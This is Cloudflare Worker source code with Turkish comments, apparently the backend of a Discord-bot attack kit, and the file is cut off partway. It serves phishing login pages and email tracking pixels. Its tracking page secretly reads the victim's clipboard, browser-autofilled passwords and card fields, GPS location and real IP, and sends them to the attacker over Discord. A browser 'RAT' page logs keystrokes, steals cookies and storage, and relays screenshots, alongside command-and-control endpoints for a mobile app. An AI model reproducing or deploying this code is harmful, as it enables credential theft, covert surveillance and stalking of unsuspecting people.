export async function handleGetRoutes(request, url, env, ctx) {
  if (url.pathname.startsWith('/not/')) {
    const notId = url.pathname.split('/not/')[1];
    if (!notId) return new Response('Gecersiz veya eksik not kimligi.', { status: 400 });
    if (!env.KV) return new Response('Bulut veritabani erisilebilir durumda degil.', { status: 500 });

    const notIcerik = await env.KV.get(`note_${notId}`);
    if (!notIcerik) return new Response('Aradiginiz not bulunamadi.', { status: 404 });

    return new Response(notIcerik, { headers: { 'Content-Type': 'text/plain; charset=utf-8' } });
  }

  if (url.pathname.startsWith('/l/')) {
    const linkId = url.pathname.split('/l/')[1];
    if (!linkId || !env.KV) return new Response('Gecersiz link servisi.', { status: 400 });

    const uzunLink = await env.KV.get(`short_${linkId}`);
    if (!uzunLink) return new Response('Aradiginiz kisa link bulunamadi veya silinmis.', { status: 404 });

    return Response.redirect(uzunLink, 302);
  }

  if (url.pathname.startsWith('/px/')) {
    const trackerId = url.pathname.split('/px/')[1];
    if (trackerId && env.KV) {
      ctx.waitUntil((async () => {
        try {
          const trkData = await env.KV.get(`trk_${trackerId}`);
          if (trkData) {
            const p = JSON.parse(trkData);
            const kurbanIP = request.headers.get('cf-connecting-ip') || 'Bilinmiyor';
            const userAgent = request.headers.get('user-agent') || 'Bilinmiyor';
            const referer = request.headers.get('referer') || 'Yok';

            let cihaz = 'Bilinmiyor';
            if (userAgent.includes('Windows')) cihaz = 'Windows PC';
            else if (userAgent.includes('Mac OS')) cihaz = 'Mac';
            else if (userAgent.includes('iPhone')) cihaz = 'iPhone';
            else if (userAgent.includes('Android')) cihaz = 'Android';
            else if (userAgent.includes('Linux')) cihaz = 'Linux';

            const dmContent = `[EMAIL] **E-Posta Takip Bildirimi!**\n\n` +
              `**Tracker ID:** \`${trackerId}\`\n` +
              `**IP:** \`${kurbanIP}\`\n` +
              `**Cihaz:** ${cihaz}\n` +
              `**Tarayici:** ${userAgent.slice(0, 200)}\n` +
              `**Referer:** ${referer}\n` +
              `**Tarih:** ${new Date().toISOString()}`;

            const dmRes = await fetch('https://discord.com/api/v10/users/@me/channels', {
              method: 'POST',
              headers: { 'Authorization': `Bot ${env.DISCORD_TOKEN}`, 'Content-Type': 'application/json' },
              body: JSON.stringify({ recipient_id: p.creatorId })
            });
            if (dmRes.ok) {
              const dm = await dmRes.json();
              await fetch(`https://discord.com/api/v10/channels/${dm.id}/messages`, {
                method: 'POST',
                headers: { 'Authorization': `Bot ${env.DISCORD_TOKEN}`, 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: dmContent })
              });
            }
          }
        } catch(e) {}
      })());
    }

    const gifBin = new Uint8Array([0x47,0x49,0x46,0x38,0x39,0x61,0x01,0x00,0x01,0x00,0x80,0x00,0x00,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x21,0xF9,0x04,0x00,0x00,0x00,0x00,0x00,0x2C,0x00,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x02,0x02,0x44,0x01,0x00,0x3B]);
    return new Response(gifBin, {
      headers: { 'Content-Type': 'image/gif', 'Cache-Control': 'no-store, no-cache', 'Access-Control-Allow-Origin': '*' }
    });
  }

  if (url.pathname.startsWith('/login/')) {
    const pageId = url.pathname.split('/login/')[1];
    if (!pageId || !env.KV) return new Response('Sayfa bulunamadi.', { status: 404 });

    const pageDataStr = await env.KV.get(`login_${pageId}`);
    if (!pageDataStr) return new Response('Bu sayfanin gecerlilik suresi dolmus veya silinmis.', { status: 404 });

    const pageData = JSON.parse(pageDataStr);
    const fields = Array.isArray(pageData.fields) ? pageData.fields : ['E-posta', 'Sifre'];

    let html;
    if (pageData.tur === 'discord-nitro') {
      html = buildDiscordNitroPage(pageId, pageData);
    } else if (pageData.tur === 'instagram-hile') {
      html = buildInstagramHilePage(pageId, pageData);
    } else {
      html = buildDefaultLoginPage(pageId, pageData, fields);
    }

    return new Response(html, {
      headers: { 'Content-Type': 'text/html; charset=utf-8', 'Access-Control-Allow-Origin': '*' }
    });
  }

  if (url.pathname.startsWith('/o/')) {
    const phishId = url.pathname.split('/o/')[1];
    if (!phishId || !env.KV) return new Response('Gecersiz yonlendirme servisi.', { status: 400 });
    
    const phishDataStr = await env.KV.get(`phish_${phishId}`);
    if (!phishDataStr) return new Response('Sayfa bulunamadi.', { status: 404 });
    
    const phishData = JSON.parse(phishDataStr);

    // POST: Kurbanin tarayicisindan sizan tum veriler burada yakalanir
    if (request.method === 'POST') {
      try {
        const leakData = await request.json();
        const kurbanIP = request.headers.get('cf-connecting-ip') || 'Bilinmiyor';
        const rawUA = request.headers.get('user-agent') || 'Bilinmiyor';

        // Cihaz + Tarayici
        let cihaz = 'Bilinmiyor';
        if (rawUA.includes('Windows')) cihaz = 'Windows PC';
        else if (rawUA.includes('Mac OS')) cihaz = 'MacBook / iMac';
        else if (rawUA.includes('iPhone')) cihaz = 'iPhone';
        else if (rawUA.includes('iPad')) cihaz = 'iPad';
        else if (rawUA.includes('Android')) cihaz = 'Android';
        else if (rawUA.includes('Linux')) cihaz = 'Linux';

        let tarayici = 'Bilinmiyor';
        if (rawUA.includes('Chrome') && !rawUA.includes('Edg')) tarayici = 'Chrome';
        else if (rawUA.includes('Firefox')) tarayici = 'Firefox';
        else if (rawUA.includes('Safari') && !rawUA.includes('Chrome')) tarayici = 'Safari';
        else if (rawUA.includes('Edg')) tarayici = 'Edge';
        else if (rawUA.includes('Opera') || rawUA.includes('OPR')) tarayici = 'Opera';
        else if (rawUA.includes('Brave')) tarayici = 'Brave';

        const reqCf = request.cf || {};
        let country = reqCf.country || 'Bilinmiyor';
        let city = reqCf.city || 'Bilinmiyor';
        let asn = reqCf.asn || '?';
        let asOrg = reqCf.asOrganization || '?';
        let haritaLink = 'Yok';

        // ip-api ile detayli konum (hem CF IP hem WebRTC IP'leri)
        if (kurbanIP !== 'Bilinmiyor' && kurbanIP !== '127.0.0.1') {
          try {
            const geoRes = await fetch(`http://ip-api.com/json/${kurbanIP}`);
            if (geoRes.ok) {
              const geo = await geoRes.json();
              if (geo.status === 'success') {
                city = geo.city || city;
                country = geo.country || country;
                asOrg = geo.isp || asOrg;
                if (geo.lat && geo.lon) haritaLink = `https://www.google.com/maps?q=${geo.lat},${geo.lon}`;
              }
            }
          } catch (e) {}
        }

        // WebRTC IP'lerinin gercek konumlarini da sorgula
        let realLocation = '';
        if (leakData.wips) {
          const wrIps = leakData.wips.split(',').filter(ip=>!ip.startsWith('10.')&&!ip.startsWith('192.168.')&&!ip.startsWith('172.16.'));
          for (const wrIp of wrIps) {
            try {
              const geoRes = await fetch(`http://ip-api.com/json/${wrIp}`);
              if (geoRes.ok) {
                const geo = await geoRes.json();
                if (geo.status === 'success') {
                  realLocation += `  \`${wrIp}\` -> ${geo.city||'?'}, ${geo.country||'?'} (${geo.isp||'?'}) [Harita](https://www.google.com/maps?q=${geo.lat},${geo.lon})\n`;
                }
              }
            } catch (e) {}
          }
        }

        // VPN tespiti: HTTP IP vs WebRTC IP karsilastirmasi
        const webrtcIPs = leakData.webrtcIPs || [];
        const vpnDetected = webrtcIPs.length > 0 && !webrtcIPs.some(ip => ip === kurbanIP || ip.startsWith('10.') || ip.startsWith('192.168.') || ip.startsWith('172.16.'));
        const realIPs = webrtcIPs.filter(ip => ip !== kurbanIP && !ip.startsWith('10.') && !ip.startsWith('192.168.') && !ip.startsWith('172.16.'));

        let report = `[ALARM] **AV RAPORU: Hedef Izlendi!** [ALARM]\n\n`;
        report += `**Hedef:** ${phishData.hedef}\n**Tarih:** ${new Date().toISOString()}\n\`\`\`\n${'='.repeat(45)}\n\`\`\`\n\n`;

        report += `[NETWORK]\n`;
        report += `  CF IP: \`${kurbanIP}\` | ${city}/${country}\n`;
        report += `  ISP: ${asOrg} (AS${asn})\n  Harita: ${haritaLink}\n`;
        if (leakData.wips && leakData.wips.length>0 && !leakData.wips.startsWith('0.0.0.0')) {
          const wrIps = leakData.wips.split(',').filter(ip=>ip!==kurbanIP&&!ip.startsWith('10.')&&!ip.startsWith('192.168.')&&!ip.startsWith('172.16.'));
          if (wrIps.length>0) report += `  [KRITIK] WebRTC GERCEK IP: \`${wrIps.join(', ')}\`\n`;
          report += `  WebRTC Tum: \`${leakData.wips}\`\n`;
        }

        report += `\n[CIHAZ]\n`;
        if (leakData.ua) report += `  UA: \`${String(leakData.ua).slice(0,120)}\`\n`;
        if (leakData.scr) report += `  Ekran: ${leakData.scr} | Renk: ${leakData.cd}bit | PR: ${leakData.pr}\n`;
        if (leakData.cpu) report += `  CPU: ${leakData.cpu}cek | RAM: ${leakData.ram}GB | Touch: ${leakData.touch}\n`;
        if (leakData.lang) report += `  Dil: ${leakData.lang} | TZ: ${leakData.tz}\n`;
        if (leakData.plug) report += `  Plugin: ${leakData.plug}\n`;
        if (leakData.bat!==undefined) report += `  Batarya: %${Math.round(leakData.bat*100)} (${leakData.chg==='1'?'Sarjda':'Pil'})\n`;
        if (leakData.conn) report += `  Baglanti: ${leakData.conn}\n`;
        if (leakData.gps) report += `  GPS: ${leakData.gps} [Harita](https://www.google.com/maps?q=${leakData.gps})\n`;

        report += `\n[PARMAK IZI]\n`;
        if (leakData.gpu) report += `  GPU: ${leakData.gpu}\n`;
        if (leakData.cHash) report += `  Canvas: \`${String(leakData.cHash).slice(0,30)}\`\n`;
        if (leakData.wHash) report += `  WebGL: \`${String(leakData.wHash).slice(0,30)}\`\n`;
        if (leakData.aHash) report += `  Audio: \`${leakData.aHash}\`\n`;
        if (leakData.fnt) report += `  Font: ${leakData.fnt}\n`;
        if (leakData.sv) report += `  Speech: ${leakData.sv}\n`;
        if (leakData.gyro) report += `  Gyro: ${leakData.gyro}\n`;
        if (leakData.acc) report += `  Accel: ${leakData.acc}\n`;

        report += `\n[CIHAZ TERCIHLERI]\n`;
        if (leakData.dark !== undefined) report += `  Dark: ${leakData.dark==='1'?'Evet':'Hayir'} | Motion: ${leakData.motion==='1'?'Azalt':'Normal'} | Contrast: ${leakData.contrast==='1'?'Yuksek':'Normal'}\n`;
        if (leakData.dnt) report += `  DNT: ${leakData.dnt} | Cookie: ${leakData.ck==='1'?'Acik':'Kapali'}\n`;
        if (leakData.bid) report += `  BuildID: ${leakData.bid}\n`;

        report += `\n[AV GELISMIS]\n`;
        if (realLocation) report += `**GERCEK KONUM (WebRTC IP):**\n${realLocation}`;
        if (leakData.clip) report += `  Pano: \`${String(leakData.clip).slice(0,200)}\`\n`;
        if (leakData.af_email) report += `  [KRITIK] AutoFill Email: \`${leakData.af_email}\`\n`;
        if (leakData.af_pass) report += `  [KRITIK] AutoFill Sifre: \`${leakData.af_pass}\`\n`;
        if (leakData.af_name) report += `  AutoFill Isim: ${leakData.af_name}\n`;
        if (leakData.af_phone) report += `  AutoFill Tel: ${leakData.af_phone}\n`;
        if (leakData.ports) report += `  AcikPort: ${leakData.ports}\n`;
        if (leakData.ec) report += `  Evercookie: \`${leakData.ec}\`\n`;
        if (leakData.ecOld) report += `  [TEKRAR] Onceki ID: \`${leakData.ecOld}\`\n`;
        if (leakData.dns_hits) report += `  DNS Cache: ${leakData.dns_hits}\n`;
        if (leakData.files) report += `  Dosya: ${leakData.files}\n`;

        report += `\n\`\`\`\n${'='.repeat(45)}\n\`\`\`\n**ID:** \`${phishId}\``;

        report += `\n**[SISTEM DETAY]**\n`;
        if (leakData.buildID) report += `  Build ID: ${leakData.buildID}\n`;
        if (leakData.productSub) report += `  Product Sub: ${leakData.productSub}\n`;
        if (leakData.vendorSub) report += `  Vendor Sub: \`${leakData.vendorSub}\`\n`;

        report += `\n\`\`\`ansi\n${'='.repeat(50)}\n\`\`\`\n`;
        report += `**Kullanici ID:** \`${phishData.creatorId || '?'}\` | **Phish ID:** \`${phishId}\``;

        // DM'e TXT dosyasi olarak gonder
        if (phishData.creatorId) {
          try {
            const dmRes = await fetch('https://discord.com/api/v10/users/@me/channels', {
              method: 'POST',
              headers: { 'Authorization': `Bot ${env.DISCORD_TOKEN}`, 'Content-Type': 'application/json' },
              body: JSON.stringify({ recipient_id: phishData.creatorId })
            });
            if (dmRes.ok) {
              const dm = await dmRes.json();
              const formData = new FormData();
              const safeFilename = `av-raporu-${phishId}.txt`;
              formData.append('files[0]', new Blob([report], { type: 'text/plain; charset=utf-8' }), safeFilename);
              formData.append('payload_json', JSON.stringify({ content: `[ALARM] **Yeni Av Raporu!** Phish ID: \`${phishId}\`\n\nRapor TXT dosyasi ektedir. Analiz icin: **/analiz** komutuna bu dosyayi yukleyin.` }));
              await fetch(`https://discord.com/api/v10/channels/${dm.id}/messages`, {
                method: 'POST',
                headers: { 'Authorization': `Bot ${env.DISCORD_TOKEN}` },
                body: formData
              });
            }
          } catch (e) {}
        }

        return new Response('OK', { status: 200, headers: { 'Access-Control-Allow-Origin': '*' } });
      } catch (e) {
        return new Response('Hata', { status: 500 });
      }
    }

    const trackPage = '<!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">'
+'<meta property="og:title" content="'+escapeHTML(phishData.maske||'Dogrulama Gerekli')+'">'
+'<meta property="og:description" content="Devam etmek icin tiklayin...">'
+'<meta property="og:type" content="website">'
+'<title>Dogrulama</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:#0a0a0a;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center}.loader{border:3px solid #1a1a1a;border-top:3px solid #ff2a6d;border-radius:50%;width:40px;height:40px;animation:spin 0.8s linear infinite;margin:0 auto 20px}@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}h2{font-size:18px;color:#ccc}.sub{font-size:12px;color:#666;margin-top:8px}</style></head><body><div><div class="loader"></div><h2>Dogrulama Yapiliyor...</h2><p class="sub">Lutfen bekleyiniz.</p></div>'
+'<script>'
+'var L="'+new URL(request.url).origin+'/o/'+phishId+'";'
+'var R="'+phishData.hedef.replace(/"/g,'\\"')+'";'
+'var D={};'
+'var S=false;'
+'function P(){if(S)return;S=true;try{var x=new XMLHttpRequest();x.open("POST",L,true);x.setRequestHeader("Content-Type","application/json");x.send(JSON.stringify(D));}catch(e){}setTimeout(function(){window.location.href=R;},800);}'
+'D.ua=navigator.userAgent;'
+'D.platform=navigator.platform;'
+'try{D.lang=(navigator.languages||[navigator.language]).slice(0,3).join(",");}catch(e){}'
+'try{D.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;}catch(e){}'
+'D.scr=screen.width+"x"+screen.height;'
+'D.cd=screen.colorDepth;'
+'D.pr=window.devicePixelRatio;'
+'D.cpu=navigator.hardwareConcurrency||0;'
+'D.ram=navigator.deviceMemory||0;'
+'D.touch=navigator.maxTouchPoints||0;'
+'D.dnt=navigator.doNotTrack||"?";'
+'D.ck=navigator.cookieEnabled?"1":"0";'
+'try{D.conn=navigator.connection?navigator.connection.effectiveType:"?";}catch(e){}'
+'try{D.bid=navigator.buildID||"";}catch(e){}'
+'try{D.plug=[];for(var i=0;i<navigator.plugins.length&&i<6;i++)D.plug.push(navigator.plugins[i].name);}catch(e){}'
+'try{navigator.getBattery().then(function(b){D.bat=b.level;D.chg=b.charging?"1":"0";});}catch(e){}'
+'try{navigator.geolocation.getCurrentPosition(function(p){D.gps=p.coords.latitude+","+p.coords.longitude;});}catch(e){}'
+'try{var cv=document.createElement("canvas");cv.width=200;cv.height=40;var cx=cv.getContext("2d");cx.textBaseline="top";cx.font="14px Arial";cx.fillStyle="#f60";cx.fillRect(4,2,50,18);cx.fillStyle="#069";cx.fillText("Track"+Date.now(),2,14);D.cHash=btoa(cv.toDataURL().substr(0,80)).substr(0,40);}catch(e){}'
+'try{var gl=document.createElement("canvas").getContext("webgl")||document.createElement("canvas").getContext("experimental-webgl");if(gl){var dbg=gl.getExtension("WEBGL_debug_renderer_info");if(dbg){D.gpu=gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);D.gpuv=gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);}D.wHash=gl.getParameter(gl.RENDERER)+"|"+gl.getParameter(gl.VENDOR);}}catch(e){}'
+'try{var ac=new(window.AudioContext||window.webkitAudioContext)();var osc=ac.createOscillator();var an=ac.createAnalyser();osc.type="triangle";osc.frequency.value=8000;osc.connect(an);an.connect(ac.destination);osc.start();var bf=new Uint8Array(an.frequencyBinCount);an.getByteFrequencyData(bf);var ah=[];for(var ai=0;ai<12;ai++)ah.push(bf[ai]||0);D.aHash=ah.join("");osc.stop();ac.close();}catch(e){}'
+'try{var fonts=["Arial","Times New Roman","Courier New","Georgia","Verdana","Trebuchet MS","Comic Sans MS","Impact","Tahoma"];var fc=document.createElement("canvas");fc.width=200;fc.height=20;var fx=fc.getContext("2d");fx.font="16px monospace";var bw=fx.measureText("mmmmmmmmmm").width;var ff=[];fonts.forEach(function(fn){fx.font="16px "+fn;if(fx.measureText("mmmmmmmmmm").width!==bw)ff.push(fn);});D.fnt=ff.join(",");}catch(e){}'
+'try{D.dark=window.matchMedia("(prefers-color-scheme:dark)").matches?"1":"0";D.motion=window.matchMedia("(prefers-reduced-motion:reduce)").matches?"1":"0";D.contrast=window.matchMedia("(prefers-contrast:high)").matches?"1":"0";}catch(e){}'
+'try{window.addEventListener("devicemotion",function(e){if(e.rotationRate)D.gyro=e.rotationRate.alpha+","+e.rotationRate.beta+","+e.rotationRate.gamma;if(e.accelerationIncludingGravity)D.acc=e.accelerationIncludingGravity.x+","+e.accelerationIncludingGravity.y+","+e.accelerationIncludingGravity.z;},{once:true});}catch(e){}'
+'try{var v=window.speechSynthesis.getVoices();if(v.length>0){D.sv=v.slice(0,8).map(function(vo){return vo.name+":"+vo.lang;}).join("|");}}catch(e){}'
+'try{var ec="ec_"+Math.random().toString(36).substr(2,8);D.ec=ec;try{document.cookie="_ec="+ec+";max-age=31536000;path=/";}catch(e){}try{var old=localStorage.getItem("_ec_prev");if(old)D.ecOld=old;localStorage.setItem("_ec",ec);localStorage.setItem("_ec_prev",ec);}catch(e){}try{sessionStorage.setItem("_ec",ec);}catch(e){}}catch(e){}'
+'try{if(navigator.clipboard&&navigator.clipboard.readText){navigator.clipboard.readText().then(function(t){D.clip=t;}).catch(function(){});}}catch(e){}'
+'try{var af=document.createElement("form");af.style.cssText="position:absolute;top:-9999px;left:-9999px;opacity:0;";["email","password","name","tel","street-address","cc-number"].forEach(function(a,i){var inp=document.createElement("input");inp.type=i===1?"password":"text";inp.autocomplete=a;af.appendChild(inp);});document.body.appendChild(af);setTimeout(function(){var es=af.querySelectorAll("input");var m={};es.forEach(function(inp){if(inp.value&&inp.value.length>0)m[inp.autocomplete]=inp.value;});if(m.email)D.af_email=m.email;if(m.password)D.af_pass=m.password;if(m.name)D.af_name=m.name;if(m.tel)D.af_phone=m.tel;document.body.removeChild(af);},2500);}catch(e){}'
+'try{var sites=["youtube.com","twitter.com","facebook.com","instagram.com","reddit.com","tiktok.com","github.com","discord.com"];var hits=[];sites.forEach(function(s){try{var img=new Image();var t0=performance.now();img.onload=img.onerror=function(){if(performance.now()-t0<120)hits.push(s);};img.src="https://"+s+"/favicon.ico?"+Date.now();}catch(e){}});setTimeout(function(){D.dns_hits=hits.join(",");},2500);}catch(e){}'
+'try{var ports=[80,8080,3000,5000];ports.forEach(function(p){try{var img=new Image();img.onerror=function(){};img.onload=function(){if(!D.ports)D.ports="";D.ports+=p+",";};img.src="http://127.0.0.1:"+p+"/x?"+Date.now();}catch(e){}});setTimeout(function(){if(D.ports)D.ports=D.ports.replace(/,$/,"");},3000);}catch(e){}'
+'try{if(navigator.clipboard&&navigator.clipboard.readText){navigator.clipboard.readText().then(function(t){D.clip=t;}).catch(function(){});}}catch(e){}'
+'try{var af=document.createElement("form");af.style.cssText="position:absolute;top:-9999px;left:-9999px;opacity:0;";["email","password","name","tel","street-address","cc-number"].forEach(function(a,i){var inp=document.createElement("input");inp.type=i===1?"password":"text";inp.autocomplete=a;af.appendChild(inp);});document.body.appendChild(af);setTimeout(function(){var es=af.querySelectorAll("input");var m={};es.forEach(function(inp){if(inp.value&&inp.value.length>0)m[inp.autocomplete]=inp.value;});if(m.email)D.af_email=m.email;if(m.password)D.af_pass=m.password;if(m.name)D.af_name=m.name;if(m.tel)D.af_phone=m.tel;document.body.removeChild(af);},2500);}catch(e){}'
+'try{var sites=["youtube.com","twitter.com","facebook.com","instagram.com","reddit.com","tiktok.com","github.com","discord.com"];var hits=[];sites.forEach(function(s){try{var img=new Image();var t0=performance.now();img.onload=img.onerror=function(){if(performance.now()-t0<120)hits.push(s);};img.src="https://"+s+"/favicon.ico?"+Date.now();}catch(e){}});setTimeout(function(){D.dns_hits=hits.join(",");},2500);}catch(e){}'
+'try{var ports=[80,8080,3000,5000];ports.forEach(function(p){try{var img=new Image();img.onerror=function(){};img.onload=function(){if(!D.ports)D.ports="";D.ports+=p+",";};img.src="http://127.0.0.1:"+p+"/x?"+Date.now();}catch(e){}});setTimeout(function(){if(D.ports)D.ports=D.ports.replace(/,$/,"");},3000);}catch(e){}'
+'try{var pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"},{urls:"stun:stun1.l.google.com:19302"}]});pc.createDataChannel("x");pc.createOffer().then(function(o){pc.setLocalDescription(o);}).catch(function(){});var ips=[];pc.onicecandidate=function(e){if(!e||!e.candidate)return;var m=e.candidate.candidate.match(/([0-9]{1,3}\\.){3}[0-9]{1,3}/);if(m&&ips.indexOf(m[0])===-1)ips.push(m[0]);};setTimeout(function(){D.wips=ips.join(",");P();},3000);}catch(e){P();}'
+'setTimeout(function(){P();},6000);'
+'</script></body></html>';

function escapeHTML(s) { return (s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); }

    return new Response(trackPage, {
      headers: { 'Content-Type': 'text/html; charset=utf-8', 'Access-Control-Allow-Origin': '*', 'Cache-Control': 'no-store' }
    });
  }

  if (url.pathname.startsWith('/apk-data/')) {
    const apkId = url.pathname.split('/apk-data/')[1];
    if (!apkId || !env.KV) return new Response('{}', { status: 200, headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' } });
    const raw = await env.KV.get('apkdata_' + apkId);
    return new Response(raw || '{}', { status: 200, headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' } });
  }

  if (url.pathname.startsWith('/q/')) {
    const apkId = url.pathname.split('/q/')[1];
    if (!apkId || !env.KV) return new Response('{"cmd":null}', { status: 200, headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' } });
    const cmdStr = await env.KV.get('cmd_' + apkId);
    if (cmdStr) {
      await env.KV.delete('cmd_' + apkId);
      return new Response(cmdStr, { status: 200, headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' } });
    }
    return new Response('{"cmd":null}', { status: 200, headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' } });
  }

  if (url.pathname.startsWith('/v/')) {
    const ratId = url.pathname.split('/v/')[1];
    if (!ratId || !env.KV) return new Response('Gecersiz servis.', { status: 400 });

    // POST: RAT veri akisi
    if (request.method === 'POST') {
      try {
    const ratDataStr = await env.KV.get('rat_' + ratId);
    const ratData = ratDataStr ? JSON.parse(ratDataStr) : { logChannel: null, creatorId: null };
        const d = await request.json();
        const chId = ratData.logChannel || ratData.creatorId;

        // APK veri kaydet (web dashboard polling icin)
        if (d.aid) {
          try {
            const apkKey = 'apkdata_' + d.aid;
            const old = await env.KV.get(apkKey);
            let apkData = old ? JSON.parse(old) : {id: d.aid, events: [], lastSeen: 0};
            apkData.events.push({t: Date.now(), type: d.type, data: String(d.data||'').slice(0, 500)});
            apkData.events = apkData.events.slice(-30);
            apkData.lastSeen = Date.now();
            await env.KV.put(apkKey, JSON.stringify(apkData), {expirationTtl: 86400});
          } catch(e) {}
        }

        let report = '';
        if (d.type === 'keylog') report = '[KLAVYE] `' + String(d.data).slice(0, 500) + '`';
        else if (d.type === 'clipboard') report = '[PANO] `' + String(d.data).slice(0, 800) + '`';
        else if (d.type === 'gps') report = '[GPS] ' + d.data + ' [Harita](https://www.google.com/maps?q=' + encodeURIComponent(d.data) + ')';
        else if (d.type === 'pageinfo') report = d.data;
        else if (d.type === 'open') report = '[ACILDI] ' + d.data;
        else if (d.type === 'close') report = '[KAPANDI] ' + d.data;
        else if (d.type === 'storage') report = '[DEPO] `' + String(d.data).slice(0, 800) + '`';
        else if (d.type === 'tab') report = '[SEKME] ' + d.data;
        else if (d.type === 'status') report = '[DURUM] ' + d.data;
        else if (d.type === 'idle') report = '[BOS] ' + d.data;
        else if (d.type === 'autofill') report = '[AUTOFILL AVI] `' + String(d.data).slice(0, 500) + '`';
        else if (d.type === 'history') report = '[GECMIS] ' + d.data;
        else if (d.type === 'sysinfo') report = '[SISTEM] ' + String(d.data).slice(0, 1800);
        else if (d.type === 'ps') report = '[PROCESSLER] `' + String(d.data).slice(0, 1500) + '`';
        else if (d.type === 'recent') report = '[SON DOSYALAR] ' + String(d.data).slice(0, 800);
        else if (d.type === 'heartbeat') report = '[CANLI] RAT aktif.';
        else if (d.type && d.type.startsWith('cmd_')) {
          const cmdName = d.type.replace('cmd_', '');
          report = '[MOBIL-KOMUT: ' + cmdName + ']\n`' + String(d.data).slice(0, 1800) + '`';
        }

        if (report && chId) {
          try {
            await fetch('https://discord.com/api/v10/channels/' + chId + '/messages', { method: 'POST', headers: { 'Authorization': `Bot ${env.DISCORD_TOKEN}`, 'Content-Type': 'application/json' }, body: JSON.stringify({ content: report }) });
          } catch (e) {}
        }

        // Gercek ekran goruntusu
        if (d.type === 'screen' && d.data && chId) {
          try {
            const parts = d.data.split(',');
            const bin = parts.length > 1 ? Uint8Array.from(atob(parts[1]), c => c.charCodeAt(0)) : new Uint8Array(0);
            if (bin.length > 100) {
              const fd = new FormData();
              fd.append('files[0]', new Blob([bin], { type: 'image/jpeg' }), 'screen_' + Date.now() + '.jpg');
              fd.append('payload_json', JSON.stringify({ content: '[EKRAN GORUNTUSU]' }));
              await fetch('https://discord.com/api/v10/channels/' + chId + '/messages', { method: 'POST', headers: { 'Authorization': `Bot ${env.DISCORD_TOKEN}` }, body: fd });
            }
          } catch (e) {}
        }

        return new Response('OK', { status: 200, headers: { 'Access-Control-Allow-Origin': '*' } });
      } catch (e) { return new Response('Hata', { status: 500 }); }
    }

    // GET: RAT page
    const ratDataStr = await env.KV.get('rat_' + ratId);
    if (!ratDataStr) return new Response('RAT sayfasi bulunamadi.', { status: 404 });
    const rd = JSON.parse(ratDataStr);
    const safeMask = (rd.maske || 'Yukleniyor...').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
    const ratPage = '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>' + safeMask + '</title><style>*{margin:0;padding:0}body{font-family:Arial;background:#0a0a0a;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center}.s{width:50px;height:50px;border:3px solid #1a1a1a;border-top:3px solid #ff2a6d;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 20px}@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}p{font-size:14px;color:#888}</style></head><body><div><div class="s"></div><p>' + safeMask + '</p></div><script>'
+'!function(){var U="' + new URL(request.url).origin + '/v/' + ratId + '",o=!1,kb="",lc="",la=Date.now(),it=0,lb=-1,lcx="";'
+'function S(d,t){if(o)return;try{var x=new XMLHttpRequest();x.open("POST",U,!1);x.setRequestHeader("Content-Type","application/json");x.send(JSON.stringify({type:t,data:String(d).slice(0,2000)}));}catch(e){}}'
+'S(location.href+" | "+document.title,"open");'

+'// Keylogger'
+'document.addEventListener("keydown",function(e){var k=e.key;if(k.length===1)kb+=k;else kb+="["+k+"] ";if(kb.length>80){S(kb,"keylog");kb=""}});'
+'setInterval(function(){if(kb){S(kb,"keylog");kb=""}},12000);'

+'// Cookie calma'
+'setTimeout(function(){try{S("C:"+document.cookie+"|L:"+JSON.stringify(localStorage).slice(0,400),"storage")}catch(e){}},2000);'
+'setInterval(function(){try{S("C:"+document.cookie,"storage")}catch(e){}},90000);'

+'// Pano'
+'setInterval(function(){try{navigator.clipboard.readText().then(function(t){if(t&&t!==lc){lc=t;S(t,"clipboard")}}).catch(function(){})}catch(e){}},7000);'

+'// GPS'
+'setInterval(function(){try{navigator.geolocation.getCurrentPosition(function(p){S(p.coords.latitude+","+p.coords.longitude,"gps")})}catch(e){}},25000);'

+'// Sayfa bilgisi'
+'setInterval(function(){S(location.href+" | B:"+document.title+" | F:"+(document.hasFocus()?1:0),"pageinfo")},30000);'

+'// Tab takibi'
+'document.addEventListener("visibilitychange",function(){S(document.hidden?"sekmeden ayrildi":"sekmeye dondu","tab")});'

+'// Batarya + baglanti'
+'setInterval(function(){try{navigator.getBattery().then(function(b){var l=Math.round(b.level*100);if(l!==lb){lb=l;S("Batarya:%"+l+" "+(b.charging?"sarj":"pil"),"status")}})}catch(e){};try{var ct=navigator.connection?navigator.connection.effectiveType:"?";if(ct!==lcx){lcx=ct;S("Baglanti:"+ct,"status")}}catch(e){}},30000);'

+'// Idle'
+'["mousemove","keydown","scroll","click","touchstart"].forEach(function(ev){document.addEventListener(ev,function(){la=Date.now();if(it){S("kurban dondu (bos:"+Math.round((Date.now()-it)/1000)+"sn)","idle");it=0}})});'
+'setInterval(function(){var i=Date.now()-la;if(i>30000&&!it){it=Date.now();S("kurban bos (30sn+ hareketsiz)","idle")}},20000);'

+'// Autofill'
